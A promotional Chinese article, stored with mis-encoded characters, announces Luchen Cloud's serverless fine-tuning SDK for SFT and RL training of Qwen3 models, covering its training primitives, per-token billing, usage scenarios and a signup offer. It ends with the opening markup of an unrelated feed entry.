<p>å¦‚ä»Šï¼Œå¼€å‘è€…å¯ä»¥æŠŠç ”ç©¶ç²¾åŠ›å’Œç®—åŠ›æˆæœ¬ä»é›†ç¾¤è¿ç»´è¿˜åŸè‡³ç®—æ³•æœ¬èº«ï¼Œæ„Ÿå—ã€Œæœ¬åœ°å†™ç ï¼Œäº‘ç«¯è®¡ç®—ã€çš„**ã€Œè®­ç»ƒå³æœåŠ¡ï¼ˆTraining as a Serviceï¼‰ã€<strong>ã€Œæµç•…ä½“éªŒã€</strong>ã€‚**</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6a7b8f04ecf4ca6acfe388a597775ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=2K2P4dNau1aUVqSsJsYDV4kIN8c%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œé¢ è¦†æ€§äººæ•ˆæ¯”ã€</strong></p>
<p><strong>ã€Œ1 åç®—æ³•å·¥ç¨‹å¸ˆé¡¶æ›¿åºå¤§ Infra å›¢é˜Ÿã€</strong></p>
<p><strong>ã€Œæ½æ™¨äº‘å¾®è°ƒã€</strong> <strong>ã€ŒSDKã€</strong> <strong>ã€Œçš„æ ¸å¿ƒæ€è·¯å¯ä»¥æ¦‚æ‹¬ä¸ºï¼š</strong>ã€Œ<strong>ã€Œç®—æ³•ã€</strong>ã€<strong>å·¥ç¨‹å¸ˆå®šä¹‰ç®—æ³•é€»è¾‘ï¼Œæ½æ™¨äº‘æå®š Infraã€‚ã€</strong></p>
<p>åœ¨ä¼ ç»Ÿçš„å¼€å‘ä¸­ï¼Œç”¨æˆ·å¾€å¾€è¦èŠ±å¤§é‡ç²¾åŠ›å»ç§Ÿèµåˆé€‚çš„ç®—åŠ›é›†ç¾¤ã€ç®¡ç†ç¯å¢ƒé…ç½®ã€è°ƒè®­ç»ƒæ¡†æ¶å’Œé›†ç¾¤è¿ç»´ã€‚</p>
<p>ä½†æ½æ™¨äº‘å°†å¤§æ¨¡å‹è®­ç»ƒæ‹†è§£æˆäº†ä¸€ç»„æ ‡å‡†çš„å‡½æ•°åŸè¯­ï¼Œæ‰“é€šäº†**ã€Œä» SFT åˆ° RL çš„å…¨é“¾è·¯ã€**ï¼š</p>
<ul>
<li>**Forward &amp; Backwardï¼š**å¤„ç†å‰å‘ä¼ æ’­ä¸æ¢¯åº¦è®¡ç®—</li>
<li>**Optimizer Stepï¼š**æ‰§è¡Œæƒé‡æ›´æ–°ç­–ç•¥</li>
<li>**Sample (Rollout)ï¼š**åšæ¨ç†ç”Ÿæˆå’Œè¯„ä¼°ï¼Œä½¿ç”¨æˆ·ä¸ä»…å¯ä»¥å®Œæˆ SFTï¼Œæ›´èƒ½è½»æ¾æ„å»º PPOã€GRPOã€DPO ç­‰å¤æ‚çš„å¼ºåŒ–å­¦ä¹ ï¼ˆRLHF/RLAIFï¼‰è®­ç»ƒæµ</li>
<li>**Save Stateï¼š**ç®¡ç†æ¨¡å‹æ£€æŸ¥ç‚¹ä¸çŠ¶æ€ä¿å­˜</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f1b527f4166439592784c8ac7d1ed4d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=KkkXABZRwxWpUVot%2F2B5yAxWcAo%3D" alt="" loading="lazy"/></p>
<p>è¿™æ„å‘³ç€ï¼Œç”¨æˆ·å¯ä»¥åœ¨æœ¬åœ°ç†Ÿæ‚‰çš„ Jupyter Notebook æˆ– IDE é‡Œï¼Œç”¨æœ€æ ‡å‡†çš„ Python è¯­æ³•åƒæ­ç§¯æœ¨ä¸€æ ·è‡ªç”±ç»„åˆï¼ŒæŒæ§è®­ç»ƒé€»è¾‘çš„ç»†èŠ‚ã€‚</p>
<p>è¿™ç§æ¨¡å¼å¸¦æ¥äº†é¢ è¦†æ€§çš„ã€ŒäººåŠ›æ•ˆèƒ½æ¯”ã€æå‡â€”â€”</p>
<p>å®ƒå°†åŸæœ¬éœ€è¦è¿ç»´å·¥ç¨‹å¸ˆã€Infra å·¥ç¨‹å¸ˆã€å¹³å°å·¥ç¨‹å¸ˆå’Œç®—æ³•å·¥ç¨‹å¸ˆç´§å¯†é…åˆçš„åºå¤§å›¢é˜Ÿï¼Œç®€åŒ–ä¸ºäº†ã€Œä¸€ä¸ªç®—æ³•å·¥ç¨‹å¸ˆã€çš„ç‹¬ç«‹é—­ç¯ã€‚</p>
<p>ç”¨æˆ·ä¸å†è¢«åº•å±‚ç¹æ‚çš„åŸºå»ºæ‹–ç´¯ï¼Œä¸å†èƒŒè´Ÿå¤šèŒèƒ½çš„æ·é”ï¼Œä¹Ÿä¸å†æ˜¯é»‘ç›’å¡«å‚çš„è¢«åŠ¨æ‰§è¡Œè€…ï¼Œè€Œæ˜¯èƒ½å¤Ÿç‹¬ç«‹é©¾é©­å¤§è§„æ¨¡è®­ç»ƒæµçš„ä¸»åŠ¨è®¾è®¡å¸ˆã€‚</p>
<p>æ— è®ºæ˜¯ç›‘ç£å¾®è°ƒï¼ˆSFTï¼‰è¿˜æ˜¯æ›´å¤æ‚çš„å¼ºåŒ–å­¦ä¹ ï¼ˆRLï¼‰Pipelineï¼Œéƒ½èƒ½é€šè¿‡ç»„åˆè¿™äº›åŸå­å‡½æ•°æ¥çµæ´»æ„å»ºã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26bb98f33470489186a6edb6ea015731~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=yGIld%2FRcaBvlgb5L4ZV6vilEyMM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0aa617ee5b9c4e5da10f9cf1f72ee3dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=Odrw2wGeeXouxd2kCuZ14RqVmoM%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œä¸ºä»€ä¹ˆè¿™ç§ä½“éªŒå¦‚æ­¤ä¸æ»‘ï¼Ÿã€</strong></p>
<p>ä¸ºäº†å®ç°æè‡´çš„æµç•…åº¦ï¼Œæ½æ™¨äº‘åŸºäºç°æœ‰çš„ GPU äº‘æœåŠ¡æ¶æ„å®ç°äº†ä¸€å¥—å®Œæ•´çš„åç«¯ç³»ç»Ÿã€‚</p>
<p>åœ¨å…·ä½“å®ç°ä¸­ï¼Œæ½æ™¨äº‘é‡‡â½¤æ§åˆ¶â¾¯ä¸è®¡ç®—â¾¯åˆ†ç¦»è®¾è®¡ï¼Œé€šè¿‡ç»Ÿâ¼€ API Server ç®¡ç†è·¨åœ°åŸŸçš„å¤šä¸ª GPU è®¡ç®—é›†ç¾¤ï¼Œå®ç°å¤šäº‘éƒ¨ç½²èƒ½â¼’ã€‚</p>
<p>æ ¸â¼¼é‡‡â½¤åŸºäº Future æ¨¡å¼çš„å¼‚æ­¥ APIï¼Œæ‰€æœ‰è®­ç»ƒæ“ä½œâ½€æŒâ¾®é˜»å¡è°ƒâ½¤ï¼Œâ½¤â¼¾â½†éœ€ç­‰å¾… GPU è®¡ç®—å®Œæˆå³å¯ç»§ç»­æ‰§â¾åç»­é€»è¾‘ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31b55b362630455b9d3e5fc6da05737e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=u%2FHs6YFLEk3LsIgeiu561HsFMV8%3D" alt="" loading="lazy"/></p>
<p>æ½æ™¨äº‘å¾®è°ƒ SDK è¿˜å…·å¤‡æ™ºèƒ½é˜Ÿåˆ—ç³»ç»Ÿã€‚</p>
<p>å³ä½¿åœ¨èµ„æºæ´ªå³°æœŸï¼Œä»»åŠ¡ä¹Ÿä¼šè‡ªåŠ¨è¿›å…¥æŒä¹…åŒ–é˜Ÿåˆ—ï¼ˆPersistence Queueï¼‰ï¼Œä¸€æ—¦åº•å±‚èµ„æºå¯ç”¨ï¼Œæ¯«ç§’çº§å¯åŠ¨ï¼š</p>
<ul>
<li>é˜Ÿåˆ—ç­‰å¾…æœŸé—´ 0 è®¡è´¹</li>
<li>ä»…å¯¹å®é™… prefill + sample + train çš„ Token é‡æ”¶è´¹</li>
</ul>
<p>å½»åº•å‘Šåˆ«èµ„æºé—²ç½®æµªè´¹ï¼Œè®©ç”¨æˆ·çš„æ¯ä¸€åˆ†é’±éƒ½ç”¨åœ¨äº§ç”Ÿæ¢¯åº¦çš„åˆ€åˆƒä¸Šã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2bd7dba619614e4da6ac3ab449c0af44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=EG2p88oGaTshifEw%2BcdDV10SvH0%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œæ¨¡å‹å¾®è°ƒç®—åŠ›é›¶å”®é©å‘½ã€</strong></p>
<p><strong>ã€Œä»åŒ…æœºç§Ÿèµåˆ°æŒ‰ Token è®¡è´¹ã€</strong></p>
<p>å¦‚æœè¯´ã€Œæ˜“ç”¨æ€§ã€æ˜¯åè®­ç»ƒå¹³å°çš„å…¥åœºåˆ¸ï¼Œé‚£ä¹ˆã€Œæˆæœ¬ç»“æ„ã€åˆ™æ˜¯å†³å®šè°èƒ½èµ°å¾—æ›´è¿œçš„æŠ¤åŸæ²³ã€‚</p>
<p>åœ¨ä¼ ç»Ÿäº‘ä¸»æœºçš„ã€ŒåŒ…æœº / æ—¶ç§Ÿã€æ¨¡å¼ä¸­ï¼Œç”¨æˆ·ä¸€ç›´åœ¨ä¸ºã€Œè¿‡ç¨‹ã€ä¹°å•â€”â€”æ— è®ºæ˜¯åœ¨åŠ è½½æ•°æ®ã€è°ƒè¯•ä»£ç ï¼Œè¿˜æ˜¯ä»…ä»…åœ¨æ€è€ƒ Loss å‡½æ•°ï¼Œåªè¦å ç”¨äº†æ˜¾å¡ï¼Œè®¡è´¹è¡¨å°±åœ¨è·³åŠ¨ã€‚</p>
<p>è¿™ç§æ¨¡å¼ä¸‹ï¼Œ<strong>ã€Œå¼€å‘è¿‡ç¨‹ä¸­æœ‰ä¸€åŠä»¥ä¸Šçš„é¢„ç®—éƒ½æµªè´¹åœ¨äº†è¿™äº›æ²¡æœ‰å®é™…äº§å‡ºçš„ã€Œåƒåœ¾æ—¶é—´ã€é‡Œã€</strong>ã€‚</p>
<p>æ½æ™¨äº‘ä¸ºå¾®è°ƒå¤§æ¨¡å‹åœºæ™¯å¼•å…¥äº† Serverless æ¶æ„ï¼Œæ¨è¡Œã€ŒæŒ‰ Token è®¡è´¹ã€çš„å•†ä¸šæ¨¡å¼ï¼Œå°†å¾®è°ƒåœºæ™¯çš„ç®—åŠ›æœåŠ¡åˆ‡åˆ†åˆ°äº†æœ€ç»†çš„é¢—ç²’åº¦ï¼š</p>
<ul>
<li>ä¸ºä»·å€¼ä»˜è´¹</li>
</ul>
<p>å°±åƒä½¿ç”¨æ¨ç† API ä¸€æ ·ï¼Œç”¨æˆ·åªéœ€ä¸º Prefillï¼ˆè¾“å…¥ï¼‰ã€Sampleï¼ˆæ¨ç†è¾“å‡ºï¼‰å’Œ Trainï¼ˆè®­ç»ƒï¼‰äº§ç”Ÿçš„**ã€Œæœ‰æ•ˆè®¡ç®— Tokens é‡ã€**ä»˜è´¹ã€‚</p>
<ul>
<li>å…¶ä»–ç¯èŠ‚å…¨å…è´¹</li>
</ul>
<p>æœ¬åœ°ä»£ç è°ƒè¯•ã€ç¯å¢ƒé…ç½®ã€æ•°æ®é¢„å¤„ç†ã€æ¨¡å‹ Checkpoint ä¿å­˜â€¦â€¦ è¿™äº›åœ¨ä¼ ç»Ÿç§Ÿå¡æ¨¡å¼ä¸‹åˆ†ç§’å¿…äº‰çš„ç¯èŠ‚ï¼Œåœ¨æ½æ™¨äº‘**ã€Œå…¨éƒ¨å…è´¹ã€**ã€‚</p>
<ul>
<li>æè‡´æ€§ä»·æ¯”</li>
</ul>
<p>é€šå¸¸ï¼ŒRL éœ€è¦åŒæ—¶ç»´æŠ¤é«˜ååçš„æ¨ç†é›†ç¾¤ï¼ˆvLLMï¼‰å’Œè®­ç»ƒé›†ç¾¤ï¼Œç®—åŠ›æˆæœ¬æé«˜ã€‚</p>
<p>ä½†åœ¨æ½æ™¨äº‘ä¸Šï¼Œå®æµ‹åŸºäºå®˜æ–¹ Cookbook çš„ math_rlÂ recipe è·‘é€šåŒ…å« Rollout é‡‡æ ·ã€Reward è¯„åˆ†å’Œ PPO æ›´æ–°çš„**ã€Œå®Œæ•´ RL æµç¨‹ã€<strong>ï¼ˆ~300 stepsï¼‰ï¼Œæ€»ç®—åŠ›æˆæœ¬</strong>ã€Œä»… 8.61 å…ƒã€**ã€‚</p>
<p>è¿™æ„å‘³ç€ï¼Œä¸ªä½“å¼€å‘è€…ä¹Ÿèƒ½ä½æˆæœ¬å¤ç° RLHF/RLAIF æ¢ç´¢ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8c0ed485aa34846bfba37b306f4993d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=PVn%2FILiFDLuYrAg3GbCelHyQO5o%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09de642f94dd48408c61a80ecc914dba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=om2Prw1Qp%2BSPawA%2FM%2ByhFSW34vQ%3D" alt="" loading="lazy"/></p>
<p><strong>ã€ŒæŠ€æœ¯è½åœ°çš„ä¸‰ä¸ªåœºæ™¯ã€</strong></p>
<p><strong>ã€ŒSFT ä¸ RL åŒæ—¶å¼€ç®±å³ç”¨ã€</strong></p>
<p>è¿™ç§æ–°æ¨¡å¼ï¼Œä¹Ÿå°†å½»åº•æ”¹å˜ä¸åŒé¢†åŸŸå¼€å‘è€…çš„å·¥ä½œæµï¼š</p>
<ul>
<li>ç§‘ç ”åœºæ™¯ï¼šå‘Šåˆ«èµ„æºç„¦è™‘</li>
</ul>
<p>å­¦æœ¯ç•Œï¼Œæ—¶é—´ä¸ç®—åŠ›å¾€å¾€æ˜¯æœ€ç´§ç¼ºçš„èµ„æºã€‚ç ”ç©¶äººå‘˜ä¸ä»…è¦é¢å¯¹ç¹ççš„é›†ç¾¤è¿ç»´ï¼ˆSlurm/Docker é…ç½®ï¼‰ï¼Œè¿˜è¦åº”å¯¹æ˜‚è´µçš„å®éªŒå¤ç°æˆæœ¬ã€‚</p>
<p>æ½æ™¨äº‘å¾®è°ƒ SDK æ”¯æŒã€Œç™½ç›’çº§ã€çš„ç§‘ç ”æ¢ç´¢ï¼Œå…¨é¢å…¼å®¹ Tinker APIã€‚</p>
<p>ç ”ç©¶äººå‘˜å¯ä»¥è‡ªå®šä¹‰ Evaluation é€»è¾‘ã€é€šè¿‡ Forward/Backwardï¼ŒSample ç­‰åŸè¯­ç²¾ç¡®æ§åˆ¶åè®­ç»ƒå’Œå¼ºåŒ–å­¦ä¹  Pipelineï¼Œè€Œæ— éœ€å…³å¿ƒåº•å±‚çš„åˆ†å¸ƒå¼å®ç°ï¼Œè®©å®éªŒå¤ç°æˆæœ¬å¤§å¹…é™ä½ã€‚</p>
<ul>
<li><strong>ã€Œåˆ›ä¸šä¸ç‹¬ç«‹å¼€å‘ï¼šæé€ŸéªŒè¯ã€</strong> <strong>ã€ŒMVPã€</strong></li>
</ul>
<p>å¯¹äºåˆåˆ›å›¢é˜Ÿï¼Œã€Œå¿«ã€æ˜¯ç”Ÿå­˜æ ¹æœ¬ã€‚åˆ©ç”¨æ½æ™¨äº‘å¾®è°ƒ SDK çš„ Serverless ç‰¹æ€§ï¼Œå¼€å‘è€…æ— éœ€ç­‰å¾…èµ„æºæ’æœŸã€‚</p>
<p>é…åˆæä½çš„ Token æˆæœ¬ï¼Œå®æµ‹ä» pip install åˆ°è·‘é€šä¸€ä¸ªåŒ…å« 1000 æ¡æ ·æœ¬çš„ SFT æˆ– RL å¾®è°ƒå®éªŒï¼Œä»…éœ€æ•°åˆ†é’Ÿã€‚</p>
<p>è¿™ç§æè‡´çš„è¾¹é™…æˆæœ¬ï¼Œè®©åˆ›ä¸šè€…æ•¢äºåœ¨æœ‰é™é¢„ç®—ä¸‹å¿«é€Ÿè¿­ä»£ Reward æ¨¡å‹ï¼Œå®ç°çœŸæ­£çš„ã€Œä½æˆæœ¬è¯•é”™ã€ã€‚</p>
<ul>
<li><strong>ã€Œå·¥ä¸šçº§</strong>ã€Œ<strong>ã€Œè½åœ°ã€</strong>ã€<strong>ï¼šå¤æ‚æ¶æ„çªå›´ã€</strong></li>
</ul>
<p>åœ¨é‡‘èã€åŒ»ç–—ç­‰å‚ç›´é¢†åŸŸçš„å·¥ä¸šåº”ç”¨ä¸­ï¼Œå·²æœ‰å¾®è°ƒ API å¾€å¾€éš¾ä»¥åº”å¯¹å¤æ‚çš„å¼‚æ„æ¶æ„ä¸ RLHF/RLAIF éœ€æ±‚ã€‚</p>
<p>æ½æ™¨äº‘å¾®è°ƒ SDK å…è®¸å·¥ç¨‹å¸ˆé€šè¿‡ train_step è‡ªç”±å®šä¹‰ Loss é€»è¾‘ä¸å¼ºåŒ–å­¦ä¹ å¥–åŠ±å‡½æ•°ã€‚</p>
<p>å¼€å‘è€…æ‹¥æœ‰å¯¹æ¨¡å‹æƒé‡ä¸è®­ç»ƒç»†èŠ‚çš„å®Œæ•´æ§åˆ¶æƒ**ï¼Œ**å®ç°ç«¯åˆ°ç«¯å®šåˆ¶ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db00c9a2bc274aaab3ea809b8319b7d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=6jqglOtmgD4h8tfBVZCSD5Jm6XQ%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œæç®€å®æˆ˜ã€</strong></p>
<p><strong>ã€Œä¸‰æ­¥ä¸Šæ‰‹ã€</strong></p>
<p>æ²¡æœ‰å¤æ‚çš„é›†ç¾¤é…ç½®ï¼Œæ²¡æœ‰å†—é•¿çš„ Docker æ„å»ºã€‚</p>
<p>ä½¿ç”¨æ½æ™¨äº‘å¾®è°ƒ SDKï¼Œè®­ç»ƒä¸€ä¸ªå¤§æ¨¡å‹å°±åƒå†™æ™®é€š Python è„šæœ¬ä¸€æ ·ç®€å•ï¼š</p>
<ol>
<li>Install &amp; Import:</li>
</ol>

<pre><code class="hljs">pipÂ install hpcai
</code></pre>
<p>2.  Initialize Clientï¼š</p>
<p>ç›®å‰å·²æ”¯æŒ Qwen3 ç³»åˆ—ï¼ˆ4B - 32Bï¼‰ï¼Œæ›´å¤šæ¨¡å‹å³å°†ä¸Šçº¿ã€‚</p>
<ol start="3">
<li>Define Training Loop &amp; Runï¼š</li>
</ol>
<p>åƒåœ¨æœ¬åœ°å†™ PyTorch ä¸€æ ·ï¼Œæ‹¥æœ‰å¯¹è®­ç»ƒå¾ªç¯çš„å®Œæ•´æ§åˆ¶æƒã€‚</p>
<p>â½¬å‰ï¼Œå¾®è°ƒ SDK å·²è¦†ç›– Qwen3 ç³»åˆ—æ¨¡å‹ï¼ˆ4Bã€8Bã€14Bã€32Bï¼‰ï¼Œæ”¯æŒç›‘ç£å­¦ä¹ å’Œå¼ºåŒ–å­¦ä¹ è®­ç»ƒæ–¹å¼ï¼Œå¹¶å°†æŒç»­æ‰©å±•æ›´å¤šæ¨¡å‹èƒ½åŠ›ä¸ç»†åˆ†è½åœ°åœºæ™¯ï¼Œå¤§å®¶ä¹Ÿå¯ä»¥å‘å®˜æ–¹æäº¤éœ€æ±‚ push æ›´æ–°ã€‚</p>
<p><strong>ã€Œå¹³å°è¿˜å‡†å¤‡äº†å¼€ç®±å³ç”¨çš„ HPC-AI Cookbookã€</strong>ï¼Œæä¾›åŒ…æ‹¬ <strong>ã€ŒDeepSeek-R1 GRPOã€</strong> <strong>ã€Œç®—æ³•ã€</strong>ã€<strong>ã€ŒåŸºäº Verifier çš„æ•°å­¦æ¨ç†ã€</strong>ã€**ã€Œè‡ªå®šä¹‰ Reward å‡½æ•°ã€**ç­‰å¤æ‚ RL åœºæ™¯çš„å®Œæ•´ä»£ç å®ç°ã€‚</p>
<p>å¼€å‘è€…æ— éœ€ä»é›¶æ„å»ºå¤æ‚çš„ PPO/GRPO æµæ°´çº¿ï¼Œåªéœ€å¤åˆ¶ Cookbook ä¸­çš„ã€Œé…æ–¹ã€ï¼Œ<strong>ã€Œè¿è¡Œè½»é‡çº§æœ¬åœ°ã€</strong> <strong>ã€Œtrain.pyã€</strong> **è„šæœ¬ï¼Œå³å¯é©±åŠ¨äº‘ç«¯å¤æ‚çš„åˆ†å¸ƒå¼ RL è®­ç»ƒæµï¼Œ**åœ¨æ½æ™¨äº‘ä¸Šå¤ç°å…·å¤‡å¤æ‚é€»è¾‘æ¨ç†èƒ½åŠ›çš„ SOTA æ¨¡å‹ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53e88a38c10544e2ba44aea4ca8a0ca3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paw5pm65YWD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768472414&amp;x-signature=ygW9y83oWEZucwQy1qW%2FHaJA89s%3D" alt="" loading="lazy"/></p>
<p><strong>ã€Œç°åœ¨ä½“éªŒã€</strong></p>
<p>åè®­ç»ƒæ­£ä»å­¦æœ¯æ”¯çº¿å‡çº§ä¸ºå·¥ç¨‹ä¸»çº¿ï¼ŒAI åŸºç¡€è®¾æ–½çš„ç»ˆæå½¢æ€åº”è¯¥æ˜¯ã€Œé›¶è®¤çŸ¥è´Ÿè·ã€â€”â€”</p>
<p>å¼€å‘è€…åªéœ€æè¿°æ•°æ®ä¸ç®—æ³•ï¼Œå…¶ä½™ï¼ˆç§Ÿå¡ã€é…ç¯å¢ƒã€å¹¶è¡Œç­–ç•¥ã€è¿ç»´è°ƒåº¦ã€æ•…éšœè‡ªæ„ˆï¼Œä¹ƒè‡³ RL æ¶‰åŠçš„ä¸€ç³»åˆ—å·¥ç¨‹åŒ–çš„å·¥ä½œï¼‰å…¨éƒ¨ä¸‹æ²‰åˆ°ç”¨æˆ·æ— æ„Ÿã€‚</p>
<p>å½“ GPU é—²ç½®æˆæœ¬è¶‹è¿‘äº 0ï¼Œç¯å¢ƒé…ç½®æ—¶é—´è¶‹è¿‘äº 0ï¼Œé•¿åºåˆ— RLHF ä¹Ÿèƒ½æŒ‰ Token å³æ—¶è®¡è´¹ï¼Œåº”ç”¨åˆ›æ–°æ•ˆç‡ç›´æ¥é€¼è¿‘ç®—åŠ›ä¸Šé™ã€‚</p>
<p>æ½æ™¨äº‘å¾®è°ƒ SDK ä»Šæ—¥èµ·å…¨é‡å¼€æ”¾ï¼š</p>
<ul>
<li>æ— éœ€ç™½åå•ï¼Œæ— éœ€é¢„çº¦</li>
<li>å‰ 150 åä¸“å±é“¾æ¥æ³¨å†Œå³å¾— 30 å…ƒä½¿ç”¨é¢åº¦ï¼ˆå¯ç‚¹å‡»ã€é˜…è¯»åŸæ–‡ã€‘è·³è½¬ï¼‰ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.luchentech.com%2Faccount%2Fsignup%3Finvitation_code%3DXZY" target="_blank" title="https://cloud.luchentech.com/account/signup?invitation_code=XZY" ref="nofollow noopener noreferrer">cloud.luchentech.com/account/sigâ€¦</a></li>
</ul>
<p>æŠŠèµ„æºå¼¹æ€§äº¤ç»™å¹³å°ï¼ŒæŠŠç®—æ³•è‡ªç”±åº¦ç•™ç»™è‡ªå·±ï¼Œæ¯ä¸€åˆ†é’±éƒ½ç”¨åœ¨äº§ç”Ÿæ¢¯åº¦çš„åˆ€åˆƒä¸Šï¼</p>
<p>ç«‹å³ä½“éªŒï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.luchentech.com%2Ffine-tuning" target="_blank" title="https://cloud.luchentech.com/fine-tuning" ref="nofollow noopener noreferrer">cloud.luchentech.com/fine-tuning</a></p>
<p>ä½¿ç”¨æ–‡æ¡£ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.luchentech.com%2Fdoc%2Fdocs%2Ffinetune-sdk%2F" target="_blank" title="https://cloud.luchentech.com/doc/docs/finetune-sdk/" ref="nofollow noopener noreferrer">cloud.luchentech.com/doc/docs/fiâ€¦</a></p>
<p>Tinker SDKï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fthinking-machines-lab%2Ftinker" target="_blank" title="https://github.com/thinking-machines-lab/tinker" ref="nofollow noopener noreferrer">github.com/thinking-maâ€¦</a></p>
<p>DeepSeek-R1ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2501.12948" target="_blank" title="https://arxiv.org/pdf/2501.12948" ref="nofollow noopener noreferrer">arxiv.org/pdf/2501.12â€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[wllama]çº¯å‰ç«¯å®ç°å¤§è¯­è¨€æ¨¡å‹è°ƒç”¨ï¼šåœ¨æµè§ˆå™¨é‡Œè·‘ AI æ˜¯ä»€ä¹ˆä½“éªŒã€‚ä»¥è°ƒç”¨è…¾è®¯ HY-MT1.5 æ··å…ƒç¿»è¯‘æ¨¡å‹ä¸ºä¾‹]]></title>    <link>https://juejin.cn/post/7592803747471540274</link>    <guid>https://juejin.cn/post/7592803747471540274</guid>    <pubDate>2026-01-08T10:49:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592803747471540274" data-draft-id="7592803747471458354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="[wllama]çº¯å‰ç«¯å®ç°å¤§è¯­è¨€æ¨¡å‹è°ƒç”¨ï¼šåœ¨æµè§ˆå™¨é‡Œè·‘ AI æ˜¯ä»€ä¹ˆä½“éªŒã€‚ä»¥è°ƒç”¨è…¾è®¯ HY-MT1.5 æ··å…ƒç¿»è¯‘æ¨¡å‹ä¸ºä¾‹"/> <meta itemprop="keywords" content="å‰ç«¯,AIGC,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-08T10:49:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Electrolux"/> <meta itemprop="url" content="https://juejin.cn/user/3004311888208296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            [wllama]çº¯å‰ç«¯å®ç°å¤§è¯­è¨€æ¨¡å‹è°ƒç”¨ï¼šåœ¨æµè§ˆå™¨é‡Œè·‘ AI æ˜¯ä»€ä¹ˆä½“éªŒã€‚ä»¥è°ƒç”¨è…¾è®¯ HY-MT1.5 æ··å…ƒç¿»è¯‘æ¨¡å‹ä¸ºä¾‹
